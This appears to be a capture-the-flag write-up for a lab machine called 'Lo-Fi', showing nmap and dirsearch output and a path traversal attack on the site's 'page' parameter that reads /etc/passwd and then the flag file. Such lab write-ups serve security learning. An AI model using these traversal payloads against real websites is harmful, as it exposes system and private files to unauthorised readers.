# Lo-Fi

IP - 10.10.24.125

## Scanning and Enumeration
nmap scan:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e5:17:a6:3b:5e:04:da:60:b8:d7:24:bf:9e:60:66:65 (RSA)
|   256 38:20:20:0c:47:6f:0e:d4:2a:83:40:2d:a5:14:2c:4c (ECDSA)
|_  256 4f:fe:71:f5:e5:8b:5e:e1:fe:78:f5:29:1e:fe:11:b8 (ED25519)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|*http-title: Lo-Fi Music
| http-methods:
|*  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
```

dirsearch:
```
/index.php
/index.php/login/
```

## LFI Path Traversal 
- In Lo-Fi website, I noticed if you click on one of the options under "Discography" the URL might be vulnerable to Path Traversal.
- To test this theory, I modified the URL - ../../../../etc/passwd. This helped me to display system files, confirming that the website is indeed vulnerable to a Path Traversal attack
![image](https://github.com/user-attachments/assets/ce12ca18-0f73-4bec-b2cf-e37a2f75bc44)


- To find the flag all I needed to do was to modify the URL again but this time changed it to - ``` http://10.10.24.125/?page=../../../../flag.txt ``` - which gave me the flag.txt file!
